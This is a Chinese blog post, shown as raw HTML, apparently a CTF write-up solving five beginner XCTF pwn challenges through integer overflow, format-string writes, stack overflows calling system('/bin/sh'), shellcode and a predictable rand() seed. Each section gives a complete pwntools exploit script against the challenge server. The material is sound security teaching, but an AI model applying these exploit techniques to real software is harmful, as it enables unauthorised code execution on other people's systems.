@@ -1,0 +1,180 @@
+<!DOCTYPE html><html lang="ch" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>xctf新手区部分wp | yojrevo's blog</title><meta name="description" content="新手区部分wpint_overflow链接：int_overflow这是一个和整数溢出有关的题。所谓整数溢出，就是整数存储的数据超过了数据类型能表示的范围，发生的溢出。比如unsigned short型的范围是0~655535,当达到655536的时候也就是11111111再加1，变成100000000，最高位的1会被丢弃，它的值就变成了0。先checksec，只开了NX发现有后门函数主函数没有问"><meta name="keywords" content="PWN"><meta name="author" content="yojrevo"><meta name="copyright" content="yojrevo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="shortcut icon" href="/img/touxiang.jpg"><link rel="canonical" href="http://example.com/2020/08/01/xctf%E6%96%B0%E6%89%8B%E5%8C%BA%E9%83%A8%E5%88%86wp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><meta property="og:type" content="article"><meta property="og:title" content="xctf新手区部分wp"><meta property="og:url" content="http://example.com/2020/08/01/xctf%E6%96%B0%E6%89%8B%E5%8C%BA%E9%83%A8%E5%88%86wp/"><meta property="og:site_name" content="yojrevo's blog"><meta property="og:description" content="新手区部分wpint_overflow链接：int_overflow这是一个和整数溢出有关的题。所谓整数溢出，就是整数存储的数据超过了数据类型能表示的范围，发生的溢出。比如unsigned short型的范围是0~655535,当达到655536的时候也就是11111111再加1，变成100000000，最高位的1会被丢弃，它的值就变成了0。先checksec，只开了NX发现有后门函数主函数没有问"><meta property="og:image" content="http://example.com/img/touxiang.jpg"><meta property="article:published_time" content="2020-08-01T09:42:36.000Z"><meta property="article:modified_time" content="2020-08-15T15:26:09.810Z"><meta name="twitter:card" content="summary"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime: 'days',
+  date_suffix: {"one_hour":"Just","hours":"hours ago","day":"days ago"},
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+    },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-08-15 23:26:09'
+}</script><noscript><style type="text/css">
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+  }
+}
+
+var autoChangeMode = 'false'
+var t = saveToLocal.get('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (saveToLocal.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">11</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">3</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E5%8C%BA%E9%83%A8%E5%88%86wp"><span class="toc-number">1.</span> <span class="toc-text">新手区部分wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#int-overflow"><span class="toc-number">1.1.</span> <span class="toc-text">int_overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#string"><span class="toc-number">1.2.</span> <span class="toc-text">string</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cgpwn2"><span class="toc-number">1.3.</span> <span class="toc-text">cgpwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CGfsb"><span class="toc-number">1.4.</span> <span class="toc-text">CGfsb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#guess-num"><span class="toc-number">1.5.</span> <span class="toc-text">guess_num</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(/img/index.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yojrevo's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">xctf新手区部分wp</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-08-01T09:42:36.000Z" title="Created 2020-08-01 17:42:36">2020-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-15T15:26:09.810Z" title="Updated 2020-08-15 23:26:09">2020-08-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"> </div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="新手区部分wp"><a href="#新手区部分wp" class="headerlink" title="新手区部分wp"></a>新手区部分wp</h1><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>链接：<br><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058&page=1">int_overflow</a><br>这是一个和整数溢出有关的题。所谓整数溢出，就是整数存储的数据超过了数据类型能表示的范围，发生的溢出。比如unsigned short型的范围是0~655535,当达到655536的时候也就是11111111再加1，变成100000000，最高位的1会被丢弃，它的值就变成了0。<br>先checksec，只开了NX<br><img src="https://s1.ax1x.com/2020/08/04/a0G1N8.png" alt="image"><br>发现有后门函数<br><img src="https://s1.ax1x.com/2020/08/04/a0NbJf.png" alt="image"><br>主函数没有问题，跟进<br><img src="https://s1.ax1x.com/2020/08/04/a0NXQg.png" alt="image"><br>到login函数发现passwd读取很长，有0x199字节，但不够栈溢出，继续跟进到check_passwd<br><img src="https://s1.ax1x.com/2020/08/04/a0aHxS.png" alt="image"><br>这里就发现问题，check_passwd下面使用strcpy进行了拷贝，把buf拷贝到了dest，dest距离ebp0x14个字节，但是s是可以又0x199字节的，这里很明显可以栈溢出。但是前面对s的长度进行了检测，长度大于3就会报错。存储长度的是整型变量v3，unsigned __int8大小是8bit,范围时0~255。这里就要利用整数溢出，当s的长度在259～264之间时，数据溢出发生高位截断，最高位的1被舍弃，一样可以通过检测。</p>
+<p><img src="https://s1.ax1x.com/2020/08/04/a0JCvj.png" alt="image"><br>然后就可以构造出payload，这里p32(0)填充ebp的时候发生了错误”Invalid Password”。因为strlen()读到’\0’就停止了，p32(0)会发生截断，换成’aaaa’或者其他。用后门函数地址覆盖返回地址，然后再附加一些填充字符到262个字节以保证能通过检测。payload=b’a’*0x14+’aaaa’+p32(flag_addr)+’a’*234<br>exp</p>
+<pre><code>from pwn import*
+#p=process(&#39;./int_overflow&#39;)
+p=remote(&quot;220.249.52.133&quot;,59437)
+p.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)
+p.sendlineafter(&quot;Please input your username:\n&quot;,&#39;a&#39;)
+flag_addr=0x804868B
+payload=b&#39;a&#39;*0x14+p32(0xdeadbeef)+p32(flag_addr)+&#39;a&#39;*234
+p.sendlineafter(&quot;Please input your passwd:\n&quot;,payload)
+p.interactive()</code></pre>
+<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>链接：<br><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5056&page=1">string</a><br>这题是格式化字符串加上shellcode<br>先checksec,开了栈保护和堆栈不可执行<br><img src="https://s1.ax1x.com/2020/08/04/a0W6un.png" alt="image"><br>main函数打印了两个地址，很可疑<br><img src="https://s1.ax1x.com/2020/08/04/a0bKsS.png" alt="image"><br>sub_400D72：<br><img src="https://s1.ax1x.com/2020/08/04/aBcgC4.png" alt="image"><br>sub_400A7D:只能选择east<br><img src="https://s1.ax1x.com/2020/08/04/aBgiGQ.png" alt="image"><br>sub_4009DD:<br><img src="https://s1.ax1x.com/2020/08/04/aBgwJe.png" alt="image"><br>sub_400BB9:<br>发现可以格式化字符串的地方printf(&amp;format,&amp;format)<br><img src="https://s1.ax1x.com/2020/08/04/aBc0uq.png" alt="image"><br>sub_400CA6:<br>发现可以shellcode。函数最后把v1强制转化成一个函数指针，然后调用这个函数。只要把shellcode read到v1的位置，就可以getshell了。<br><img src="https://s1.ax1x.com/2020/08/04/aBDHeS.png" alt="image"><br>这里需要满足*a1 == a1[1]，返回去看，可以发现这个a1就是主函数里的v4，而v4等于v3，v3[1]=85,也就是说a1[1]其实就是85，只要在a1位置写上85就可以了。</p>
+<p>就用格式化字符串，把a1地址写到v2位置，也就是说把地址放栈上，然后第二次输入格式化字符串用栈上的地址修改成值。栈顶偏移为6，地址偏移为7。payload构造为’%85c%7$n’。<br><img src="https://s1.ax1x.com/2020/08/04/aBshKP.png" alt="image"><br>成功cat flag<br><img src="https://s1.ax1x.com/2020/08/04/aB63Y4.png" alt="image"><br>逆向基础真是很重要呀…这些个简单题目也看半天，这么久才做粗来。太慢了。</p>
+<p>exp<br>‘’’<br>from pwn import*<br>context.arch=”amd64”<br>#p=process(‘./string’)<br>p=remote(“220.249.52.133”,36005)<br>p.recvuntil(“secret[0] is “)<br>addr1=p.recvline().replace(“\n”,””)<br>print addr1<br>p.recvuntil(“secret[1] is “)<br>addr2=p.recvline().replace(“\n”,””)</p>
+<p>p.sendlineafter(“character’s name be:\n”,”name”)<br>p.sendlineafter(“east or up?:\n”,”east”)<br>p.sendlineafter(“or leave(0)?:\n”,’1’)<br>#gdb.attach(p,”b*0x400C7E”)<br>#addr=u64((int(addr1,16)))<br>p.sendlineafter(“‘Give me an address’\n”,str(int(addr1, 16)))</p>
+<p>payload=’%85c%7$n’<br>p.sendlineafter(“And, you wish is:\n”,payload)<br>p.sendlineafter(“Wizard: I will help you! USE YOU SPELL\n”,asm(shellcraft.sh()))<br>p.interactive()<br>‘’’</p>
+<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>这题简单<br>链接：<br><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5059&page=1">cgpwn2</a><br>checksec,只开了NX堆栈不可执行<br><img src="https://s1.ax1x.com/2020/08/04/aDKJw8.png" alt="image"><br>main:<br><img src="https://s1.ax1x.com/2020/08/04/aDtXan.png" alt="image"><br>hello:<br>gets函数那里可以栈溢出<br><img src="https://s1.ax1x.com/2020/08/04/aDtwU1.png" alt="image"><br>有system函数，但是没有’/bin/sh’，所以可以在输入name的时候输入/bin/sh，自己整一个出来。这样’/bin/sh’的地址也就是name的地址。<br><img src="https://s1.ax1x.com/2020/08/04/aDNXOe.png" alt="image"><br>成功cat flag<br><img src="https://s1.ax1x.com/2020/08/04/aDdmR0.png" alt="image"><br>或者这个题用ROP链先泄露，算一下’/bin/sh’的地址应该也一样能做。<br>exp </p>
+<pre><code>from pwn import*
+#p=process(&#39;./cgpwn2&#39;)
+p=remote(&#39;220.249.52.133&#39;,59983)
+p.sendlineafter(&quot;please tell me your name\n&quot;,&#39;/bin/sh&#39;)
+name_addr=0x804A080
+sys_addr=0x8048420
+payload=b&#39;a&#39;*0x26+p32(0xdeadbeef)+p32(sys_addr)+p32(0)+p32(name_addr)
+p.sendlineafter(&quot;hello,you can leave some message here:\n&quot;,payload)
+p.interactive()</code></pre>
+<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>链接：<br><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5050&page=1">CGfsb</a><br>checksec,开了栈保护和NX堆栈不可执行<br><img src="https://s1.ax1x.com/2020/08/04/aDwUts.png" alt="image"><br>main函数：<br>只要pwnme等于8就可以cat flag。pwnme在bss段。很明显23行printf(&amp;s)可以格式化字符串利用，修改pwnn值。<br><img src="https://s1.ax1x.com/2020/08/04/aDBkZD.png" alt="image"><br><img src="https://s1.ax1x.com/2020/08/04/aDBTFH.png" alt="image"></p>
+<p>可能程序太短，gdb老跑过。就格式化字符串打印出来看一下偏移。偏移是10。%n会把前面打印的所有字符数写到目的地址，pwnn要改的值是8，但是前面还打印了p32（pwnme_bss），所以%4c就够了。payload=p32(pwnme_bss)+’%4c%10$n’<br><img src="https://s1.ax1x.com/2020/08/04/aDceJg.png" alt="image"><br>成功cat flag<br><img src="https://s1.ax1x.com/2020/08/04/aD2APS.png" alt="image"></p>
+<p>exp</p>
+<pre><code>from pwn import*
+#p=process(&#39;./CGfsb&#39;)
+p=remote(&quot;220.249.52.133&quot;,35838)
+#gdb.attach(p,&quot;b *0x80486CD&quot;)
+pwnme_bss=0x804A068
+
+p.sendlineafter(&quot;please tell me your name:\n&quot;,&#39;name&#39;)
+payload=p32(pwnme_bss)+&#39;%4c%10$n&#39;
+p.sendlineafter(&quot;leave your message please:\n&quot;,payload)
+p.interactive()</code></pre>
+<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>这题贼简单<br>链接：<br><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5057&page=1">guess_num</a><br>先checksec，栈保护，堆栈不可写，PIE全都开了<br><img src="https://s1.ax1x.com/2020/08/04/aBxRRH.png" alt="image"><br>看主函数，一个猜数游戏，需要使输入的v4和随机数v6相等，如果连续猜对十次就success，直接获得flag。<br><img src="https://s1.ax1x.com/2020/08/04/aBzPFU.png" alt="image"><br>sub_C3E()：<br><img src="https://s1.ax1x.com/2020/08/04/aBzJOI.png" alt="image"><br>随机函数生成的随机数并不是真的随机数，是根据seeds算出来的，只要知道seeds的值，就可以知道随机数的值。在22行gets存在栈溢出，可以用它覆盖seeds的值。</p>
+<p>覆盖seeds以后，调用srand()和rand()函数生成需要的随机数列。ctypes库是python的一个外部函数库，通过它可以调用所有C语言实现的库函数。ctypes提供了两个LibraryLoader：CDLL和WinDLL。CDLL支持__cdecl，WinDLL支持__stdcall。用LoadLibrary函数加载动态链接库到内存。生成随机数，循环十次。<br>成功cat flag<br><img src="https://s1.ax1x.com/2020/08/04/aDn97F.png" alt="image"><br>exp</p>
+<pre><code>from pwn import*
+from ctypes import*
+#p=process(&quot;./guess_num&quot;)
+p=remote(&quot;220.249.52.133&quot;,33442)
+payload=&#39;a&#39;*0x20+p64(1)
+p.sendlineafter(&quot;Your name:&quot;,payload)
+libc=cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+libc.srand(1)
+for i in range(10):
+    num=str(libc.rand()%6+1)
+    p.recvuntil(&quot;number:&quot;)
+    p.sendline(num)
+p.interactive()
+</code></pre>
+<p>在脚本中通过elf文件查找libc的时候报错</p>
+<pre><code>elf = ELF(&#39;./guess_num&#39;)
+libc = elf.libc
+#AttributeError: &#39;ELF&#39; object has no attribute &#39;srand&#39;</code></pre>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">yojrevo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2020/08/01/xctf%E6%96%B0%E6%89%8B%E5%8C%BA%E9%83%A8%E5%88%86wp/">http://example.com/2020/08/01/xctf%E6%96%B0%E6%89%8B%E5%8C%BA%E9%83%A8%E5%88%86wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/touxiang.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg"/></a><div class="post-qr-code-desc"></div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/05/shellcode2/"><img class="prev-cover" src="/" onerror="onerror=null;src='/img/background.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">shellcode（二）</div></div></a></div><div class="next-post pull-right"><a href="/2020/07/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"><img class="next-cover" src="/" onerror="onerror=null;src='/img/background.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">格式化字符串</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/09/20/shellcode/" title="shellcode"><img class="cover" src="/null"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-20</div><div class="title">shellcode</div></div></a></div><div><a href="/2020/08/05/shellcode2/" title="shellcode（二）"><img class="cover" src="/"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-05</div><div class="title">shellcode（二）</div></div></a></div><div><a href="/2020/08/16/xctf进阶区/" title="xctf进阶区"><img class="cover" src="/"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-16</div><div class="title">xctf进阶区</div></div></a></div><div><a href="/2020/07/04/栈溢出/" title="栈溢出"><img class="cover" src="/"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-04</div><div class="title">栈溢出</div></div></a></div><div><a href="/2020/09/20/栈迁移/" title="栈迁移"><img class="cover" src="/"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-20</div><div class="title">栈迁移</div></div></a></div><div><a href="/2020/07/09/格式化字符串/" title="格式化字符串"><img class="cover" src="/"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-09</div><div class="title">格式化字符串</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By yojrevo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"></div></div></body></html>
